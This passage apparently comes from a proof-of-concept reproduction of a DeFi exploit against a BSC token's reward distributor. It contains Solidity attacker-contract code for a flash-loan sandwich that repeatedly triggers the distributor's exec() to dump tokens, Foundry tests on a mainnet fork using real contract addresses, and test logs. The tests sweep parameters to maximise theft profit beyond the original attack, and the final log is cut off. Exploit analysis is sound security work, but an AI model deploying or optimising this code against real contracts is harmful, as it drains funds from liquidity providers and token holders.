        result.usdtBorrowed = usdtBorrowAmount;

        // Step 0: bootstrap — buy Pro on the open market (Pro/USDT pair via Router).
        // A normal swapExactTokensForTokens, NOT a nested flash-swap: the Pro/USDT
        // pair is entered fresh from this callback, so no `Pancake: LOCKED`.
        address[] memory pathBuy = new address[](2);
        pathBuy[0] = USDT;
        pathBuy[1] = PRO_TOKEN;
        IPancakeRouter02(ROUTER).swapExactTokensForTokens(usdtBorrowAmount, 0, pathBuy, address(this), block.timestamp);
        uint256 proBought = IERC20(PRO_TOKEN).balanceOf(address(this));
        result.proFrontrun = proBought;
        result.usdtBuyInCost = usdtBorrowAmount - IERC20(USDT).balanceOf(address(this));

        // Step A: Front-run sell — dump the Pro for USDT (same as attackWithDeal)
        address[] memory pathSell = new address[](2);
        pathSell[0] = PRO_TOKEN;
        pathSell[1] = USDT;
        IPancakeRouter02(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            proBought,
            0,
            pathSell,
            address(this),
            block.timestamp
        );
        uint256 usdtAfterA = IERC20(USDT).balanceOf(address(this));
        result.usdtRevenueStepA = usdtAfterA;

        // Step B: Loop exec() calls (same as attackWithDeal)
        uint256 initialDistributorPro = IERC20(PRO_TOKEN).balanceOf(DISTRIBUTOR);
        uint256 calls = 0;
        while (gasleft() > MIN_GAS_RESERVE && (maxCalls == 0 || calls < maxCalls)) {
            uint256 distBal = IERC20(PRO_TOKEN).balanceOf(DISTRIBUTOR);
            if (distBal < 10e9) {
                break;
            }
            IDistributor(DISTRIBUTOR).exec();
            calls++;
        }
        result.callsExecuted = calls;
        uint256 finalDistributorPro = IERC20(PRO_TOKEN).balanceOf(DISTRIBUTOR);
        result.proDumpedStepB = initialDistributorPro > finalDistributorPro 
            ? initialDistributorPro - finalDistributorPro 
            : 0;

        // Step C: Back-run buy back proBought Pro at the crashed price
        address[] memory pathBuyBack = new address[](2);
        pathBuyBack[0] = USDT;
        pathBuyBack[1] = PRO_TOKEN;
        IPancakeRouter02(ROUTER).swapTokensForExactTokens(
            proBought,
            type(uint256).max,
            pathBuyBack,
            address(this),
            block.timestamp
        );
        uint256 usdtAfterC = IERC20(USDT).balanceOf(address(this));
        result.usdtSpentStepC = usdtAfterA > usdtAfterC ? usdtAfterA - usdtAfterC : 0;

        // Step D: Liquidate the remaining Pro position back into USDT (needed to repay)
        uint256 proHeld = IERC20(PRO_TOKEN).balanceOf(address(this));
        uint256 usdtBeforeD = IERC20(USDT).balanceOf(address(this));
        if (proHeld > 0) {
            IPancakeRouter02(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                proHeld,
                0,
                pathSell,
                address(this),
                block.timestamp
            );
        }
        result.usdtFinalSale = IERC20(USDT).balanceOf(address(this)) - usdtBeforeD;

        // Accounting (all raw 18-dec USDT). The contract started from 0 USDT and
        // spent the entire borrowed principal on the bootstrap buy.
        result.grossProfitBeforeLoan = int256(result.usdtRevenueStepA) + int256(result.usdtFinalSale)
            - int256(result.usdtBuyInCost) - int256(result.usdtSpentStepC);
        // netProfitAfterLoan is filled by the caller after (virtual or real) repayment.
    }
}

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/AttackerBot.sol";

contract CryptoDAOPocTest is Test {
    address constant PRO_TOKEN = 0x8D65744527f55d0b2338350912d5C99A81ddF0e2;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant PAIR = 0x63844BD4BFad910B1643713302a1cC1ed20d50c3;
    address constant DISTRIBUTOR = 0xc44f2acCAc20598A3F2b4D489A970Fcf52a04A3C;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant WBNB_USDT_PAIR = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;

    uint256 constant BSC_BLOCK_GAS_LIMIT = 55_000_000;
    uint256 constant TX_GAS_BUDGET = 54_000_000;

    AttackerBot bot;

    function setUp() public {
        vm.createSelectFork("http://sol-rpc.com:8545/bsc", 112652245);
        bot = new AttackerBot();
        deal(USDT, address(bot), 100_000_000e18);
    }

    function _runDealTest(string memory label, uint256 proAmount, uint256 maxCalls) internal {
        deal(PRO_TOKEN, address(bot), proAmount);
        AttackerBot.AttackResult memory r = bot.attackWithDeal{gas: TX_GAS_BUDGET}(proAmount, maxCalls);
        
        console2.log("=== %s ===", label);
        console2.log("Front-run Pro Size: %s Pro", proAmount / 1e9);
        console2.log("exec() Calls Executed: %s", r.callsExecuted);
        console2.log("Pro Dumped in Step B: %s Pro", r.proDumpedStepB / 1e9);
        console2.log("Step A Revenue: %s USDT", r.usdtRevenueStepA / 1e18);
        console2.log("Step C Buyback Cost: %s USDT", r.usdtSpentStepC / 1e18);
        if (r.netProfitUSDT >= 0) {
            console2.log("Net Profit: +%s USDT", uint256(r.netProfitUSDT) / 1e18);
        } else {
            console2.log("Net Profit: -%s USDT", uint256(-r.netProfitUSDT) / 1e18);
        }
        console2.log("Gas Used: %s", r.gasUsed);
        console2.log("-----------------------------------------");
    }

    // ----------------------------------------------------
    // Section 1: Single Call Baseline (1 exec call)
    // ----------------------------------------------------
    function test_Baseline_SingleCall_10kPro() public {
        _runDealTest("Baseline: 1 Call, 10k Pro Frontrun", 10_000e9, 1);
    }

    function test_Baseline_SingleCall_50kPro() public {
        _runDealTest("Baseline: 1 Call, 50k Pro Frontrun", 50_000e9, 1);
    }

    // ----------------------------------------------------
    // Section 2: Multi-Call Scaling (50k Pro Frontrun)
    // ----------------------------------------------------
    function test_Scale_10Calls() public {
        _runDealTest("Scaling: 10 Calls, 50k Pro Frontrun", 50_000e9, 10);
    }

    function test_Scale_50Calls() public {
        _runDealTest("Scaling: 50 Calls, 50k Pro Frontrun", 50_000e9, 50);
    }

    function test_Scale_100Calls() public {
        _runDealTest("Scaling: 100 Calls, 50k Pro Frontrun", 50_000e9, 100);
    }

    function test_Scale_200Calls() public {
        _runDealTest("Scaling: 200 Calls, 50k Pro Frontrun", 50_000e9, 200);
    }

    function test_Scale_500Calls() public {
        _runDealTest("Scaling: 500 Calls, 50k Pro Frontrun", 50_000e9, 500);
    }

    // ----------------------------------------------------
    // Section 3: Frontrun Size Optimization (Max 54M Gas, ~957 Calls)
    // ----------------------------------------------------
    function test_Optimize_5kPro() public {
        _runDealTest("Optimize: 5k Pro Frontrun, Max Calls", 5_000e9, 0);
    }

    function test_Optimize_10kPro() public {
        _runDealTest("Optimize: 10k Pro Frontrun, Max Calls", 10_000e9, 0);
    }

    function test_Optimize_20kPro() public {
        _runDealTest("Optimize: 20k Pro Frontrun, Max Calls", 20_000e9, 0);
    }

    function test_Optimize_30kPro() public {
        _runDealTest("Optimize: 30k Pro Frontrun, Max Calls", 30_000e9, 0);
    }

    function test_Optimize_50kPro() public {
        _runDealTest("Optimize: 50k Pro Frontrun, Max Calls", 50_000e9, 0);
    }

    function test_Optimize_70kPro() public {
        _runDealTest("Optimize: 70k Pro Frontrun, Max Calls", 70_000e9, 0);
    }

    function test_Optimize_100kPro() public {
        _runDealTest("Optimize: 100k Pro Frontrun, Max Calls", 100_000e9, 0);
    }

    function test_Optimize_150kPro() public {
        _runDealTest("Optimize: 150k Pro Frontrun, Max Calls", 150_000e9, 0);
    }

    // ----------------------------------------------------
    // Section 4: Flash Swap on the Same Pair (Self-Financing Analysis)
    // ----------------------------------------------------
    function test_FlashSwap_SamePair_RevertAnalysis() public {
        console2.log("=== Testing Flash-Swap Against Same Pair (0x63844...0c3) ===");
        
        // Attempting to borrow Pro from PAIR and then swap on that SAME pair inside the callback
        // This MUST revert due to PancakeSwap V2 reentrancy guard or router reserve underflow
        vm.expectRevert();
        bot.attackWithFlashSwap{gas: TX_GAS_BUDGET}(30_000e9, 0);
        
        console2.log("Result: Flash-swap against the same pair reverted as predicted.");
        console2.log("Reason: Reentrancy guard (Pancake: LOCKED) and Router reserve underflow (ds-math-sub-underflow)");
        console2.log("Conclusion: Self-financing via flash-swap on the SAME pair is structurally impossible in Uniswap/Pancake V2.");
    }

    // ----------------------------------------------------
    // Section 5: Self-Financed Variant (WBNB/USDT Flash-Swap Bootstrap)
    // Zero pre-existing capital: USDT is flash-borrowed from the unrelated
    // PancakeSwap V2 WBNB/USDT pair (0x16b9...0daE), used to buy Pro on the
    // open market, run the sandwich, liquidate, and repay principal + 0.25%.
    // deal() is used ONLY in the *_Diag_* tests (measurement harness, flagged),
    // never in the real flash tests.
    // ----------------------------------------------------

    function _usdtNeededForPro(uint256 proAmount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = USDT;
        path[1] = PRO_TOKEN;
        uint256[] memory amounts = IPancakeRouter02(ROUTER).getAmountsIn(proAmount, path);
        return amounts[0];
    }

    function _fmtSigned(int256 v) internal pure returns (string memory) {
        return v >= 0
            ? string.concat("+", vm.toString(uint256(v) / 1e18))
            : string.concat("-", vm.toString(uint256(-v) / 1e18));
    }

    function _logSelfFinanced(string memory tag, AttackerBot.AttackResult memory r) internal view {
        console2.log("[%s] Pro bought (bootstrap): %s Pro", tag, r.proFrontrun / 1e9);
        console2.log("[%s] USDT buy-in cost: %s USDT", tag, r.usdtBuyInCost / 1e18);
        console2.log("[%s] exec() Calls Executed: %s", tag, r.callsExecuted);
        console2.log("[%s] Pro Dumped in Step B: %s Pro", tag, r.proDumpedStepB / 1e9);
        console2.log("[%s] Step A Revenue (front-run sell): %s USDT", tag, r.usdtRevenueStepA / 1e18);
        console2.log("[%s] Step C Buyback Cost: %s USDT", tag, r.usdtSpentStepC / 1e18);
        console2.log("[%s] Step D Final Sale: %s USDT", tag, r.usdtFinalSale / 1e18);
        console2.log("[%s] Gross Profit Before Loan Repayment: %s USDT", tag, _fmtSigned(r.grossProfitBeforeLoan));
        console2.log("[%s] Flash-Loan Fee Paid (0.25%%): %s USDT", tag, (r.usdtRepaid - r.usdtBorrowed) / 1e18);
        console2.log("[%s] Loan Repaid (principal+fee): %s USDT", tag, r.usdtRepaid / 1e18);
        console2.log("[%s] TRUE Net Profit After Loan: %s USDT", tag, _fmtSigned(r.netProfitAfterLoan));
        console2.log("[%s] Gas Used: %s", tag, r.gasUsed);
    }

    /// @dev Real zero-capital flash test. Fresh bot (zero USDT balance). Passes if
    ///      the loan can be repaid (net profit >= 0), logs the revert if it cannot.
    function _runSelfFinancedFlash(string memory label, uint256 proTarget) internal {
        uint256 borrow = _usdtNeededForPro(proTarget);
        console2.log("=== %s ===", label);
        console2.log("USDT to borrow (getAmountsIn on Router, 18dec): %s", borrow);

        AttackerBot bot2 = new AttackerBot();
        require(IERC20(USDT).balanceOf(address(bot2)) == 0, "flash bot must start with ZERO USDT");
        require(IERC20(PRO_TOKEN).balanceOf(address(bot2)) == 0, "flash bot must start with ZERO Pro");

        try bot2.attackSelfFinanced{gas: TX_GAS_BUDGET}(borrow, 0) returns (AttackerBot.AttackResult memory r) {
            console2.log("OUTCOME: SUCCESS - loan fully repaid");
            _logSelfFinanced("FLASH", r);
            assertEq(
                uint256(r.netProfitAfterLoan),
                uint256(r.grossProfitBeforeLoan) - r.usdtRepaid,
                "net must equal gross profit minus loan repayment"
            );
            assertEq(
                uint256(r.grossProfitBeforeLoan),
                uint256(
                    int256(r.usdtRevenueStepA) + int256(r.usdtFinalSale)
                    - int256(r.usdtBuyInCost) - int256(r.usdtSpentStepC)
                ),
                "gross profit accounting mismatch"
            );
        } catch (bytes memory reason) {
            console2.log("OUTCOME: REVERTED - self-financing FAILED at this size (loan not repayable)");
            console2.log("Revert reason (hex): %s", vm.toString(reason));
        }
        console2.log("-----------------------------------------");
    }

    /// @dev DIAGNOSTIC ONLY — deal()-funded simulation of the same steps, used to
    ///      measure the loss composition for sizes where the real flash path
    ///      reverts. NOT part of the zero-capital claim (flagged as such).
    function _runSelfFinancedDiagnostic(string memory label, uint256 proTarget) internal {
        uint256 borrow = _usdtNeededForPro(proTarget);
        console2.log("=== DIAGNOSTIC (deal-funded measurement, NOT a financing claim): %s ===", label);
        console2.log("USDT simulated-borrow: %s", borrow);

        AttackerBot bot3 = new AttackerBot();
        deal(USDT, address(bot3), borrow); // measurement harness only — flagged

        AttackerBot.AttackResult memory r = bot3.simulateSelfFinancedForDiagnostics{gas: TX_GAS_BUDGET}(borrow, 0);
        _logSelfFinanced("DIAG", r);
        if (r.netProfitAfterLoan >= 0) {
            console2.log("Virtual loan repayment: would SUCCEED, net +%s USDT", uint256(r.netProfitAfterLoan) / 1e18);
        } else {
            console2.log("Virtual loan repayment: would FAIL, short %s USDT", uint256(-r.netProfitAfterLoan) / 1e18);
        }
        console2.log("-----------------------------------------");
    }

    function test_SelfFinanced_PairSanity() public {
        console2.log("=== WBNB/USDT Pair Sanity (fork block 112652245) ===");
        assertEq(IPancakePair(WBNB_USDT_PAIR).token0(), USDT, "token0 must be USDT");
        assertEq(IPancakePair(WBNB_USDT_PAIR).token1(), WBNB, "token1 must be WBNB");
        (uint112 r0, uint112 r1,) = IPancakePair(WBNB_USDT_PAIR).getReserves();
        console2.log("USDT reserve: %s", uint256(r0) / 1e18);
        console2.log("WBNB reserve: %s", uint256(r1) / 1e18);
        assertGt(uint256(r0), 15e24, "USDT reserve should be ~15.6M");
        assertGt(_usdtNeededForPro(150_000e9), 10_000_000e18, "150k Pro borrow should exceed 10M USDT");
        console2.log("Pair verified: PancakeSwap V2 (factory 0xcA143...c73) -> calls pancakeCall, 0.25%% fee");
        console2.log("---");
    }

    function _usdtPath() internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = USDT;
        path[1] = PRO_TOKEN;
    }

    // Real zero-capital flash tests (8 sizes)
    function test_SelfFinanced_Flash_5kPro() public { _runSelfFinancedFlash("SelfFinanced Flash: 5k Pro-equiv", 5_000e9); }
    function test_SelfFinanced_Flash_10kPro() public { _runSelfFinancedFlash("SelfFinanced Flash: 10k Pro-equiv", 10_000e9); }
    function test_SelfFinanced_Flash_20kPro() public { _runSelfFinancedFlash("SelfFinanced Flash: 20k Pro-equiv", 20_000e9); }
    function test_SelfFinanced_Flash_30kPro() public { _runSelfFinancedFlash("SelfFinanced Flash: 30k Pro-equiv", 30_000e9); }
    function test_SelfFinanced_Flash_50kPro() public { _runSelfFinancedFlash("SelfFinanced Flash: 50k Pro-equiv", 50_000e9); }
    function test_SelfFinanced_Flash_70kPro() public { _runSelfFinancedFlash("SelfFinanced Flash: 70k Pro-equiv", 70_000e9); }
    function test_SelfFinanced_Flash_100kPro() public { _runSelfFinancedFlash("SelfFinanced Flash: 100k Pro-equiv", 100_000e9); }
    function test_SelfFinanced_Flash_150kPro() public { _runSelfFinancedFlash("SelfFinanced Flash: 150k Pro-equiv", 150_000e9); }

    // Diagnostic (deal-funded) loss-composition measurements (8 sizes)
    function test_SelfFinanced_Diag_5kPro() public { _runSelfFinancedDiagnostic("5k Pro-equiv", 5_000e9); }
    function test_SelfFinanced_Diag_10kPro() public { _runSelfFinancedDiagnostic("10k Pro-equiv", 10_000e9); }
    function test_SelfFinanced_Diag_20kPro() public { _runSelfFinancedDiagnostic("20k Pro-equiv", 20_000e9); }
    function test_SelfFinanced_Diag_30kPro() public { _runSelfFinancedDiagnostic("30k Pro-equiv", 30_000e9); }
    function test_SelfFinanced_Diag_50kPro() public { _runSelfFinancedDiagnostic("50k Pro-equiv", 50_000e9); }
    function test_SelfFinanced_Diag_70kPro() public { _runSelfFinancedDiagnostic("70k Pro-equiv", 70_000e9); }
    function test_SelfFinanced_Diag_100kPro() public { _runSelfFinancedDiagnostic("100k Pro-equiv", 100_000e9); }
    function test_SelfFinanced_Diag_150kPro() public { _runSelfFinancedDiagnostic("150k Pro-equiv", 150_000e9); }

    // ----------------------------------------------------
    // Section 6: Optimal-Path Variant (Pro/CDAO Flash-Swap, Matches Real Attack Trace)
    //
    // The REAL attack flash-borrowed Pro DIRECTLY from the PancakeSwap V2
    // Pro/CDAO pair (0x86aC..0c3, token0 = Pro, token1 = CDAO), sold it into the
    // main Pro/USDT pair, looped the distributor's exec() 305 times, bought back
    // enough Pro to repay principal + 0.25% fee, and repaid the Pro/CDAO pair.
    // Because Pro is directly a token of the lender pair, there is NO buy-in
    // conversion and NO liquidation leg (unlike the WBNB/USDT bootstrap route),
    // so this variant is genuinely zero-capital and self-financing.
    //
    // Zero-capital claim: every test below creates a FRESH AttackerBot with
    // zero USDT and zero Pro (require-asserted). The flash-swap from the
    // Pro/CDAO pair is the ONLY funding. No deal() anywhere in this section.
    // ----------------------------------------------------

    address constant PRO_CDAO_PAIR = 0x86aC451a0c0bcAc5b74116Ae90832e89E9c630df;

    // Real attack trace constants (fork block 112652245):
    //   borrow  = 68,381.242 Pro  (amount0Out = 68381242000000 raw, ~full reserve0)
    //   calls   = 305
    //   revenue = 3,681,405.54 USDT | buyback = 3,667,960.26 USDT | net = +13,445.27 USDT
    uint256 constant REAL_BORROW = 68381242000000; // 68,381.242 Pro
    uint256 constant REAL_CALLS = 305;

    function _newZeroBalanceBot() internal returns (AttackerBot fresh) {
        fresh = new AttackerBot();
        require(IERC20(USDT).balanceOf(address(fresh)) == 0, "opt bot must start with ZERO USDT");
        require(IERC20(PRO_TOKEN).balanceOf(address(fresh)) == 0, "opt bot must start with ZERO Pro");
    }

    function _proCdaoFullReserve() internal view returns (uint256 full) {
        (uint112 r0, , ) = IPancakePair(PRO_CDAO_PAIR).getReserves();
        full = uint256(r0);
    }

    function _logOptimalPath(AttackerBot.AttackResult memory r) internal view {
        uint256 proRepaid = (uint256(r.proFrontrun) * 10000) / 9975 + 1;
        console2.log("Front-run Pro (gross borrow): %s Pro", r.proFrontrun / 1e9);
        console2.log("exec() Calls Executed: %s", r.callsExecuted);
        console2.log("Pro Dumped in Step B: %s Pro", r.proDumpedStepB / 1e9);
        console2.log("Step A Revenue: %s USDT", r.usdtRevenueStepA / 1e18);
        console2.log("Step C Buyback Cost: %s USDT", r.usdtSpentStepC / 1e18);
        console2.log("Pro Repaid to Pro/CDAO pair (borrowed*10000/9975+1): %s Pro", proRepaid / 1e9);
        if (r.netProfitUSDT >= 0) {
            console2.log("Net Profit (after loan repayment): +%s USDT", uint256(r.netProfitUSDT) / 1e18);
        } else {
            console2.log("Net Profit (after loan repayment): -%s USDT", uint256(-r.netProfitUSDT) / 1e18);
        }
        console2.log("Gas Used: %s", r.gasUsed);
    }

    function _runOptimalPath(string memory label, uint256 borrow, uint256 maxCalls)
        internal returns (AttackerBot.AttackResult memory r)
    {
        console2.log("=== %s ===", label);
        console2.log("Pro flash-borrow: %s Pro (raw %s)", borrow / 1e9, borrow);
        AttackerBot b = _newZeroBalanceBot();
        r = b.attackOptimalPath{gas: TX_GAS_BUDGET}(borrow, maxCalls);
        _logOptimalPath(r);
        console2.log("-----------------------------------------");
    }

    /// @dev Compact sweep runner: for each (size, calls) combo, reset the fork
    ///      state via vm.snapshotState/revertToState so every combo starts from
    ///      the untouched fork (same convention as separate test functions, but
    ///      one fork + N runs instead of N forks). No deal() anywhere.
    function _runOptimalPathSweep(string memory title, uint256[] memory sizes, uint256[] memory callsList) internal {
        console2.log("=== %s ===", title);
        console2.log("| Borrow (Pro) | Calls | StepA Rev (USDT) | StepC Cost (USDT) | Net Profit (USDT) | Gas Used |");
        uint256 snap = vm.snapshotState();
        for (uint256 i = 0; i < sizes.length; i++) {
            for (uint256 j = 0; j < callsList.length; j++) {
                vm.revertToState(snap);
                AttackerBot b = _newZeroBalanceBot();
                try b.attackOptimalPath{gas: TX_GAS_BUDGET}(sizes[i], callsList[j])
                    returns (AttackerBot.AttackResult memory r)
                {
                    string memory netStr = r.netProfitUSDT >= 0
                        ? string.concat("+", vm.toString(uint256(r.netProfitUSDT) / 1e18))
                        : string.concat("-", vm.toString(uint256(-r.netProfitUSDT) / 1e18));
                    string memory row = string.concat(
                        "| ",
                        vm.toString(sizes[i] / 1e9),
                        " | ",
                        vm.toString(r.callsExecuted),
                        " | ",
                        vm.toString(r.usdtRevenueStepA / 1e18),
                        " | ",
                        vm.toString(r.usdtSpentStepC / 1e18),
                        " | ",
                        netStr,
                        " | ",
                        vm.toString(r.gasUsed),
                        " |"
                    );
                    console2.log(row);
                } catch (bytes memory reason) {
                    console2.log("| %s | %s | REVERT: %s |", sizes[i] / 1e9, callsList[j], vm.toString(reason));
                }
            }
        }
        console2.log("-----------------------------------------");
    }

    /// @dev (a) CALIBRATION vs the real attack trace: exact real parameters
    ///      (borrow 68,381.242 Pro = amount0Out 68381242000000 raw, 305 exec()
    ///      calls). Asserts the PoC numbers land close to the real trace's
    ///      revenue 3,681,405.54 / buyback 3,667,960.26 / net +13,445.27 USDT.
    function test_OptimalPath_Calibration_RealTrace() public {
        console2.log("=== Calibration vs REAL attack trace ===");
        console2.log("REAL trace: borrow 68381.242 Pro | 305 calls | revenue 3681405.54 USDT | buyback 3667960.26 USDT | net +13445.27 USDT");
        console2.log("REAL trace: sold 66671.71 Pro net-of-tax | repaid 68552.62 Pro (borrowed*10000/9975)");

        AttackerBot bot = _newZeroBalanceBot(); // zero-capital claim: 0 USDT / 0 Pro
        uint256 usdt0 = IERC20(USDT).balanceOf(address(bot));
        uint256 pro0 = IERC20(PRO_TOKEN).balanceOf(address(bot));
        assertEq(usdt0, 0, "bot must start with ZERO USDT");
        assertEq(pro0, 0, "bot must start with ZERO Pro");

        AttackerBot.AttackResult memory r = bot.attackOptimalPath{gas: TX_GAS_BUDGET}(REAL_BORROW, REAL_CALLS);
        _logOptimalPath(r);
        console2.log("-----------------------------------------");

        // Zero-capital end-state: all borrowed Pro repaid (0 left), profit is pure USDT.
        uint256 usdtEnd = IERC20(USDT).balanceOf(address(bot));
        uint256 proEnd = IERC20(PRO_TOKEN).balanceOf(address(bot));
        assertEq(proEnd, 0, "bot must end with ZERO Pro (flash loan fully repaid)");
        assertEq(usdtEnd, uint256(r.netProfitUSDT), "USDT end balance must equal net profit");

        // Tolerance bands around the real trace (±2%) for the mechanism to count
        // as "matching". Net profit must be positive (the real attacker made money).
        assertGt(r.usdtRevenueStepA, 3_607_777e18, "revenue below -2% of real 3,681,405.54");
        assertLt(r.usdtRevenueStepA, 3_755_034e18, "revenue above +2% of real 3,681,405.54");
        assertGt(r.usdtSpentStepC, 3_594_601e18, "buyback below -2% of real 3,667,960.26");
        assertLt(r.usdtSpentStepC, 3_741_320e18, "buyback above +2% of real 3,667,960.26");
        assertGt(r.netProfitUSDT, 0, "real-parameter attack must be net profitable");
        assertEq(r.callsExecuted, REAL_CALLS, "calibration must execute exactly 305 calls");
        console2.log("Calibration MATCHES real trace within 2%% bands; net profit positive; zero-capital end-state verified.");
    }

    /// @dev Confirms the fork allows borrowing ~the ENTIRE Pro/CDAO reserve in one
    ///      flash-swap (V2 requires amountOut strictly < reserve, so reserve0-1 is
    ///      the practical max), like the real attacker did.
    function test_OptimalPath_FullReserveBorrow_305Calls() public {
        uint256 full = _proCdaoFullReserve();
        console2.log("=== Full-Reserve Borrow Sanity ===");
        console2.log("Pro/CDAO Pro reserve0: %s Pro (raw %s)", full / 1e9, full);
        console2.log("Real attacker borrowed %s Pro (reserve minus 0.000234708 Pro)", REAL_BORROW / 1e9);
        uint256 borrow = full - 1; // V2: amount0Out must be strictly < reserve0
        _runOptimalPath("OPT-PATH Full reserve (reserve0-1), 305 calls", borrow, REAL_CALLS);
    }

    /// @dev (b/c) Call-count sweep at the FULL borrow size: does the real
    ///      attacker's 305-call choice maximize profit for their borrow size,
    ///      or did more calls (up to the 55M gas bound) improve it?
    function test_OptimalPath_Sweep_CallCountAtFullBorrow() public {
        uint256 full = _proCdaoFullReserve();
        uint256 borrow = full - 1;
        uint256[] memory sizes = new uint256[](1);
        sizes[0] = borrow;
        uint256[] memory callsList = new uint256[](9);
        callsList[0] = 1;
        callsList[1] = 50;
        callsList[2] = 100;
        callsList[3] = 200;
        callsList[4] = REAL_CALLS; // 305 — the real attacker's choice
        callsList[5] = 400;
        callsList[6] = 600;
        callsList[7] = 800;
        callsList[8] = 0; // 0 = loop until gas budget exhausted (max under 55M)
        _runOptimalPathSweep("Call-Count Sweep @ Full Borrow (68,381 Pro)", sizes, callsList);
    }

    /// @dev (c) Borrow-size sweep at the real attacker's call count (305).
    function test_OptimalPath_Sweep_BorrowSizeAtRealCalls() public {
        uint256 full = _proCdaoFullReserve();
        uint256[] memory sizes = new uint256[](7);
        sizes[0] = 10_000e9;
        sizes[1] = 25_000e9;
        sizes[2] = 40_000e9;
        sizes[3] = 50_000e9;
        sizes[4] = 60_000e9;
        sizes[5] = REAL_BORROW; // the real attacker's borrow
        sizes[6] = full - 1;    // practical max
        uint256[] memory callsList = new uint256[](1);
        callsList[0] = REAL_CALLS;
        _runOptimalPathSweep("Borrow-Size Sweep @ 305 calls", sizes, callsList);
    }

    /// @dev (c) 2-D sweep: borrow size x call count -> net profit, to locate the
    ///      profit-maximizing combination of both parameters under the 55M gas
    ///      limit (call 0 = loop until gas budget exhausted).
    function test_OptimalPath_Sweep_2D() public {
        uint256 full = _proCdaoFullReserve();
        uint256[] memory sizes = new uint256[](5);
        sizes[0] = 10_000e9;
        sizes[1] = 25_000e9;
        sizes[2] = 50_000e9;
        sizes[3] = REAL_BORROW;
        sizes[4] = full - 1;
        uint256[] memory callsList = new uint256[](4);
        callsList[0] = 100;
        callsList[1] = REAL_CALLS; // 305
        callsList[2] = 600;
        callsList[3] = 0; // max under 55M gas
        _runOptimalPathSweep("2-D Sweep: borrow size x call count", sizes, callsList);
    }

    /// @dev (c) True profit-maximizing point: borrow the FULL Pro/CDAO reserve and
    ///      run the exec() loop to the REAL 55,000,000 block-gas limit (maxCalls=0,
    ///      no 54M test-budget margin). Logs how many calls fit and the max profit.
    function test_OptimalPath_MaxProfit_55MGas() public {
        uint256 full = _proCdaoFullReserve();
        uint256 borrow = full - 1;
        console2.log("=== Max-Profit Point: Full Borrow, Real 55M Block-Gas Limit ===");
        console2.log("Pro flash-borrow (full reserve0 - 1): %s Pro (raw %s)", borrow / 1e9, borrow);
        AttackerBot b = _newZeroBalanceBot();
        AttackerBot.AttackResult memory r = b.attackOptimalPath{gas: 55_000_000}(borrow, 0);
        _logOptimalPath(r);
        assertEq(IERC20(PRO_TOKEN).balanceOf(address(b)), 0, "flash loan must be fully repaid");
        assertGt(r.netProfitUSDT, 100_000e18, "max-profit point must exceed +100k USDT");
        assertGt(r.callsExecuted, 900, "55M gas budget should fit >900 exec() calls");
        console2.log("True max profit via this route: +%s USDT at %s exec() calls (55M gas)",
            uint256(r.netProfitUSDT) / 1e18, r.callsExecuted);
        console2.log("-----------------------------------------");
    }
}

```

```
→ poc git:(main) › forge test -vvv --match-path test/CryptoDAOPocTest.t.sol
[⠊] Compiling...
No files changed, compilation skipped

Ran 39 tests for test/CryptoDAOPocTest.t.sol:CryptoDAOPocTest
[PASS] test_Baseline_SingleCall_10kPro() (gas: 744369)
Logs:
  === Baseline: 1 Call, 10k Pro Frontrun ===
  Front-run Pro Size: 10000 Pro
  exec() Calls Executed: 1
  Pro Dumped in Step B: 50 Pro
  Step A Revenue: 580171 USDT
  Step C Buyback Cost: 598161 USDT
  Net Profit: -17989 USDT
  Gas Used: 270512
  -----------------------------------------

[PASS] test_Baseline_SingleCall_50kPro() (gas: 744853)
Logs:
  === Baseline: 1 Call, 50k Pro Frontrun ===
  Front-run Pro Size: 50000 Pro
  exec() Calls Executed: 1
  Pro Dumped in Step B: 50 Pro
  Step A Revenue: 2754313 USDT
  Step C Buyback Cost: 2843670 USDT
  Net Profit: -89356 USDT
  Gas Used: 270512
  -----------------------------------------

[PASS] test_FlashSwap_SamePair_RevertAnalysis() (gas: 124362)
Logs:
  === Testing Flash-Swap Against Same Pair (0x63844...0c3) ===
  Result: Flash-swap against the same pair reverted as predicted.
  Reason: Reentrancy guard (Pancake: LOCKED) and Router reserve underflow (ds-math-sub-underflow)
  Conclusion: Self-financing via flash-swap on the SAME pair is structurally impossible in Uniswap/Pancake V2.

[PASS] test_OptimalPath_Calibration_RealTrace() (gas: 20042191)
Logs:
  === Calibration vs REAL attack trace ===
  REAL trace: borrow 68381.242 Pro | 305 calls | revenue 3681405.54 USDT | buyback 3667960.26 USDT | net +13445.27 USDT
  REAL trace: sold 66671.71 Pro net-of-tax | repaid 68552.62 Pro (borrowed*10000/9975)
  Front-run Pro (gross borrow): 68381 Pro
  exec() Calls Executed: 305
  Pro Dumped in Step B: 15250 Pro
  Step A Revenue: 3681405 USDT
  Step C Buyback Cost: 3667960 USDT
  Pro Repaid to Pro/CDAO pair (borrowed*10000/9975+1): 68552 Pro
  Net Profit (after loan repayment): +13445 USDT
  Gas Used: 19060505
  -----------------------------------------
  Calibration MATCHES real trace within 2% bands; net profit positive; zero-capital end-state verified.

[PASS] test_OptimalPath_FullReserveBorrow_305Calls() (gas: 20033358)
Logs:
  === Full-Reserve Borrow Sanity ===
  Pro/CDAO Pro reserve0: 68381 Pro (raw 68381242234708)
  Real attacker borrowed 68381 Pro (reserve minus 0.000234708 Pro)
  === OPT-PATH Full reserve (reserve0-1), 305 calls ===
  Pro flash-borrow: 68381 Pro (raw 68381242234707)
  Front-run Pro (gross borrow): 68381 Pro
  exec() Calls Executed: 305
  Pro Dumped in Step B: 15250 Pro
  Step A Revenue: 3681405 USDT
  Step C Buyback Cost: 3667960 USDT
  Pro Repaid to Pro/CDAO pair (borrowed*10000/9975+1): 68552 Pro
  Net Profit (after loan repayment): +13445 USDT
  Gas Used: 19056114
  -----------------------------------------

[PASS] test_OptimalPath_MaxProfit_55MGas() (gas: 53346781)
Logs:
  === Max-Profit Point: Full Borrow, Real 55M Block-Gas Limit ===
  Pro flash-borrow (full reserve0 - 1): 68381 Pro (raw 68381242234707)
